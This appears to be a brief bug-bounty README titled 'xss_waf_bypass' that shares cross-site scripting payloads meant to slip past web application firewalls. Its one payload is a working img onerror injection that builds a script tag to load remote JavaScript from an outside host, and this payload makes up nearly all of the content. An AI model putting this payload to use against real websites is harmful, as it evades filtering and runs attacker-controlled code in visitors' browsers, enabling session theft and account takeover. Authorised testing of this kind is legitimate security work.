# xss_waf_bypass
Some collection of xss payloads that worked for me to bypass wafs while doing bb

### Payloads

Inject external javascript without using `script` tag

```
<img src=x onerror="var script = document.createElement('script'); script.src = 'https://eternal.h4ck.me/xss.js'; document.head.appendChild(script);">
```
